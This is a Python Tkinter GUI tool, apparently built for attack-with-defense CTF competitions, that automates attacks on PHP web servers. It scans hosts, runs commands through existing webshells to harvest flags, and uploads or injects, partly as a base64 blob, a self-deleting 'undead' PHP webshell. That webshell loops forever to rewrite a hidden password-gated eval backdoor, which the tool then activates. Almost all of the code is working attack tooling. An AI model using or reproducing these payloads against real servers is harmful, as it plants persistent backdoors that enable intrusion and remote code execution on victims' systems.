import base64
import tkinter as tk
from PIL import Image, ImageTk
import re
import requests
import time


#-----------------------------------------------------------------------------------------子界面设置--------------------------------------------------------------------------------------------------------#

#搜索子页面
def search_ip_windows():
    root.withdraw()
    new_window = tk.Toplevel()
    new_window.title("存活主机查询")
    new_window.geometry("1280x1080")

    new_image_path = "background.jpg"
    new_image = Image.open(new_image_path)
    new_photo = ImageTk.PhotoImage(new_image)

    new_background_label = tk.Label(new_window, image=new_photo)
    new_background_label.place(x=0, y=0, relwidth=1, relheight=1)

    entry_label = tk.Label(new_window, text="输入IP段:", font=("Helvetica", 18))
    entry_label.pack()
    entry = tk.Entry(new_window, font=("Helvetica", 16), width=20)
    entry.pack()

    space_label = tk.Label(new_window, text="", font=("Helvetica", 32))
    space_label.pack()

    collect_button = tk.Button(new_window, text="一键收集IP", bg="lightgreen", command=lambda: search_ip(entry.get(), result_text))
    collect_button.pack()

    space_label2 = tk.Label(new_window, text="", font=("Helvetica", 25))
    space_label2.pack()

    result_text = tk.Text(new_window, font=("Helvetica", 16), wrap="word")
    result_text.pack(expand=True, fill="both")

    scrollbar = tk.Scrollbar(new_window, width=5, command=result_text.yview)
    scrollbar.pack(side="right", fill="y")
    result_text.config(yscrollcommand=scrollbar.set)

    new_background_label.image = new_photo

    # 添加返回按钮
    back_button = tk.Button(new_window, text="返回", bg="lightblue", command=lambda: close_window(new_window))
    back_button.place(relx=0, rely=0, anchor='nw', x=10, y=10)  # 左上角位置

    # 窗口关闭事件，结束程序
    new_window.protocol("WM_DELETE_WINDOW", root.destroy)

def close_window(window):
    window.destroy()
    root.deiconify()

#一键获取flag
def eval_windows():
    root.withdraw()
    new_window = tk.Toplevel()
    new_window.title("一键命令执行")
    new_window.geometry("1280x1080")

    new_image_path = "background.jpg"
    new_image = Image.open(new_image_path)
    new_photo = ImageTk.PhotoImage(new_image)

    new_background_label = tk.Label(new_window, image=new_photo)
    new_background_label.place(x=0, y=0, relwidth=1, relheight=1)

    entry1_label = tk.Label(new_window, text="木马文件:", font=("Helvetica", 18))
    entry1_label.pack()
    entry1 = tk.Entry(new_window, font=("Helvetica", 16), width=20)
    entry1.pack()

    entry2_label = tk.Label(new_window, text="传参点:", font=("Helvetica", 18))  # 调整字体大小
    entry2_label.pack()
    entry2 = tk.Entry(new_window, font=("Helvetica", 16), width=20)  # 调整字体大小
    entry2.pack()

    # 添加第二个参数输入框及其标签
    entry3_label = tk.Label(new_window, text="命令参数:", font=("Helvetica", 18))
    entry3_label.pack()
    entry3 = tk.Entry(new_window, font=("Helvetica", 16), width=20)
    entry3.pack()

    # 添加GET和POST选项
    option_var = tk.StringVar(value="GET")  # 默认选择GET
    option_label = tk.Label(new_window, text="选择请求方式:", font=("Helvetica", 18))  # 调整字体大小
    option_label.pack()
    get_radio = tk.Radiobutton(new_window, text="GET", variable=option_var, value="GET", font=("Helvetica", 16))
    get_radio.pack()
    post_radio = tk.Radiobutton(new_window, text="POST", variable=option_var, value="POST", font=("Helvetica", 16))
    post_radio.pack()
    shell_radio = tk.Radiobutton(new_window, text="写入不死马",variable=option_var,value="shell", font=("Helvetica", 16))
    shell_radio.pack()

    space_label = tk.Label(new_window, text="", font=("Helvetica", 32))
    space_label.pack()

    collect_button = tk.Button(new_window, text="一键获取flag", bg="lightgreen",
                               command=lambda: eval_attack(entry1.get(),entry3.get(),entry2.get(),option_var.get(),result_text))  # 修改为entry1.get()
    collect_button.pack()

    space_label2 = tk.Label(new_window, text="", font=("Helvetica", 25))
    space_label2.pack()

    result_text = tk.Text(new_window, font=("Helvetica", 16), wrap="word")
    result_text.pack(expand=True, fill="both")

    scrollbar = tk.Scrollbar(new_window, width=5, command=result_text.yview)
    scrollbar.pack(side="right", fill="y")
    result_text.config(yscrollcommand=scrollbar.set)

    new_background_label.image = new_photo

    back_button = tk.Button(new_window, text="返回", bg="lightblue", command=lambda: close_window(new_window))
    back_button.place(relx=0, rely=0, anchor='nw', x=10, y=10)  # 左上角位置

    new_window.protocol("WM_DELETE_WINDOW", root.destroy)


#一键上传不死马
def upload_windows():
    root.withdraw()
    new_window = tk.Toplevel()
    new_window.title("一键上传木马")
    new_window.geometry("1280x1080")

    new_image_path = "background.jpg"
    new_image = Image.open(new_image_path)
    new_photo = ImageTk.PhotoImage(new_image)

    new_background_label = tk.Label(new_window, image=new_photo)
    new_background_label.place(x=0, y=0, relwidth=1, relheight=1)

    entry_label = tk.Label(new_window, text="上传入口文件:", font=("Helvetica", 18))
    entry_label.pack()
    entry = tk.Entry(new_window, font=("Helvetica", 16), width=20)
    entry.pack()

    space_label = tk.Label(new_window, text="", font=("Helvetica", 32))
    space_label.pack()

    collect_button = tk.Button(new_window, text="一键上传木马", bg="lightgreen", command=lambda: upload_attack(entry.get(), result_text))
    collect_button.pack()

    space_label2 = tk.Label(new_window, text="", font=("Helvetica", 25))
    space_label2.pack()

    result_text = tk.Text(new_window, font=("Helvetica", 16), wrap="word")
    result_text.pack(expand=True, fill="both")

    scrollbar = tk.Scrollbar(new_window, width=5, command=result_text.yview)
    scrollbar.pack(side="right", fill="y")
    result_text.config(yscrollcommand=scrollbar.set)

    new_background_label.image = new_photo

    # 添加返回按钮
    back_button = tk.Button(new_window, text="返回", bg="lightblue", command=lambda: close_window(new_window))
    back_button.place(relx=0, rely=0, anchor='nw', x=10, y=10)  # 左上角位置

    # 窗口关闭事件，结束程序
    new_window.protocol("WM_DELETE_WINDOW", root.destroy)

#激活不死马子页面
def attack_file_windows():
    root.withdraw()
    new_window = tk.Toplevel()
    new_window.title("一键激活不死马")
    new_window.geometry("1280x1080")

    new_image_path = "background.jpg"
    new_image = Image.open(new_image_path)
    new_photo = ImageTk.PhotoImage(new_image)

    new_background_label = tk.Label(new_window, image=new_photo)
    new_background_label.place(x=0, y=0, relwidth=1, relheight=1)

    entry_label = tk.Label(new_window, text="filepath:", font=("Helvetica", 18))
    entry_label.pack()
    entry = tk.Entry(new_window, font=("Helvetica", 16), width=20)
    entry.pack()

    space_label = tk.Label(new_window, text="", font=("Helvetica", 32))
    space_label.pack()

    collect_button = tk.Button(new_window, text="一键激活", bg="lightgreen", command=lambda: file_attack(entry.get(), result_text))
    collect_button.pack()

    space_label2 = tk.Label(new_window, text="", font=("Helvetica", 25))
    space_label2.pack()

    result_text = tk.Text(new_window, font=("Helvetica", 16), wrap="word")
    result_text.pack(expand=True, fill="both")

    scrollbar = tk.Scrollbar(new_window, width=5, command=result_text.yview)
    scrollbar.pack(side="right", fill="y")
    result_text.config(yscrollcommand=scrollbar.set)

    new_background_label.image = new_photo

    # 添加返回按钮
    back_button = tk.Button(new_window, text="返回", bg="lightblue", command=lambda: close_window(new_window))
    back_button.place(relx=0, rely=0, anchor='nw', x=10, y=10)  # 左上角位置

    # 窗口关闭事件，结束程序
    new_window.protocol("WM_DELETE_WINDOW", root.destroy)


#------------------------------------------------------------------------------------------功能实现函数-----------------------------------------------------------------------------------------------------#
#收集存活主机
def search_ip(ip, result_text):
    ip_regex = r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    if re.match(ip_regex, ip):
        flag = 1
    else:
        flag = 0

    if flag == 1:
        ip_list = []
        ip_prefix = '.'.join(ip.split('.')[:-1])
        for i in range(43,63):
            ip_address = f"http://{ip_prefix}.{i}"
            result_text.insert(tk.END, "正在检测{}是否存活\n".format(ip_address))
            result_text.update_idletasks()
            time.sleep(0.5)
            try:
                r = requests.get(ip_address,timeout=1.5)
                ip_list.append(ip_address)
            except:
                continue
        result_text.insert(tk.END, "存活主机IP如下:\n")
        result_text.insert(tk.END, "\n".join(ip_list))

        with open('url.txt','w') as f:
            for ip in ip_list:
                f.write(ip + '\n')
    else:
        result_text.insert(tk.END, "格式错误!请重新输入")

#一键获取flag
def eval_attack(file_name,eval_args,file_args,method,result_text):

    #命令执行写入不死马的命令:
    flag_pattern = re.compile(r'flag\{.*?\}')
    flag_list = []
    with open('url.txt', 'r') as file:
        urls = file.readlines()
        urls = [url.strip() for url in urls]  #去除换行符
    if method == "GET":
        for url in urls:
            r = requests.get(url+"/"+file_name+"?"+file_args+eval_args)
            if "{}" in r.text:
                flag_list.append(r.text)
            else:
                result_text.insert(tk.END, "未能从 %s 获取flag.\n" % url)
    elif method == "POST":
        for url in urls:
            data = {
                file_args:eval_args
            }
            try:
                r = requests.post(url=url+"/"+file_name,data=data,timeout=2)
                if "{" in r.text:
                    flag_list.append(r.text)
                else:
                    result_text.insert(tk.END, "未能从 %s 获取flag.\n" % url)
            except:
                continue
        result_text.insert(tk.END, "获取到的flag如下:\n")
        result_text.insert(tk.END, "\n".join(flag_list))
    else:
        result_text.insert(tk.END,"[*]开始注入不死马\n")
        for url in urls:      #默认支持post一键写入
            data = {
                file_args: "echo\"123\";$a=base64_decode(\"PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLmNvbmZpZzIucGhwJzsKICAgICRjb2RlID0gJzw/cGhwIGlmKG1kNSgkX0dFVFsicGFzcyJdKT09PSIyODJhYjUwZjg4MGFiNDFhZmIzZTFjNjYyNGZkN2QwZSIpe0BldmFsKCRfUE9TVFsicGFzcyJdKTt9ID8+JzsKICAgIHdoaWxlICgxKXsKICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7CgkgICAgc3lzdGVtKCdjaG1vZCAreCAuY29uZmlnMi5waHAnKTsKICAgICAgICB1c2xlZXAoMTAwMCk7CiAgICB9Cj8+Cgo=\");file_put_contents(\"shell.php\",$a);"
            }
            try:
                r = requests.post(url=url+"/"+file_name,data=data)
                if "123" in r.text:
                    result_text.insert(tk.END,"[*]该{}目标木马已注入\n".format(url))
                    # print(r.text)
            except:
                continue

#一键上传不死马
def upload_attack(filename,result_text):

    context = """
    <?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.config2.php';
    $code = '<?php if(md5($_GET["pass"])==="282ab50f880ab41afb3e1c6624fd7d0e"){@eval($_POST["pass"]);} ?>';
    while (1){
        file_put_contents($file,$code);
	    system('chmod +x .config2.php');
        usleep(1000);
    }
?>
    """
    with open('url.txt', 'r') as file:
        urls = file.readlines()

    for url in urls:
        url = url.strip()
        files = {"file": ("shell.php", context, "application/octet-stream")}

        r = requests.post(url = url+"/"+filename,files=files)
        if r.status_code == 200:
            result_text.insert(tk.END,"[*]在%s中上传的木马文件为shell.php\n" % url)
            result_text.insert(tk.END,"[*]不死马的连接密码为xilitter666\n")
            result_text.insert(tk.END,r.text)
        else:
            result_text.insert(tk.END,"在 %s 中上传失败:{r.status_code}\n" % url)

#一键激活不死马
def file_attack(filepath,result_text):
    with open('url.txt', 'r') as file:
        urls = file.readlines()
    for url in urls:
        url = url.strip()
        try:
            res = requests.get(url=url+filepath+"shell.php",timeout=1)
        except:
            continue
    time.sleep(10)  #等待10秒用于生成不死马
    for url in urls:
        url = url.strip()
        data = {
            "pass":"phpinfo();"
        }
        r = requests.post(url=url+filepath+".config2.php"+"?pass=xilitter666",data=data)
        if "phpinfo" in r.text:
            result_text.insert(tk.END,"该{}的不死马已激活\n".format(url))
            result_text.update_idletasks()




#---------------------------------------------------------------------------------------------------主页面设置-----------------------------------------------------------------------------------------------#
root = tk.Tk()
root.title("AWD自制小工具")
root.geometry("1280x1080")

image_path = "background.jpg"   #处理背景图片
image = Image.open(image_path)
image = image.convert("RGBA")
image_with_alpha = Image.new("RGBA", image.size, (255, 255, 255, 200))  #增加一层半透明的白框
image = Image.alpha_composite(image_with_alpha, image)
photo = ImageTk.PhotoImage(image)

background_label = tk.Label(root, image=photo)
background_label.place(x=0, y=0, relwidth=1, relheight=1)

label1 = tk.Label(root, text="欢迎来到AWD一键脚本工具", font=("Helvetica", 24), fg="black")
label2 = tk.Label(root, text="点击以下按钮完成攻击", font=("Helvetica", 18), fg="black")
label1.pack(pady=15)
label2.pack(pady=50)

button1 = tk.Button(root, text="查询存活主机", bg="lightblue", command=search_ip_windows,width=30, height=5)
button1.pack(pady=25)

button2 = tk.Button(root, text="一键获取flag", bg="lightblue", command=eval_windows,width=30, height=5)
button2.pack(pady=25)

button3 = tk.Button(root, text="一键上传不死马", bg="lightblue", command=upload_windows,width=30, height=5)
button3.pack(pady=25)

button4 = tk.Button(root, text="一键激活不死马", bg="lightblue", command=attack_file_windows, width=10, height=2)
button4.place(relx=0, rely=0, anchor='nw', x=10, y=10)  # 左上角位置

root.mainloop()
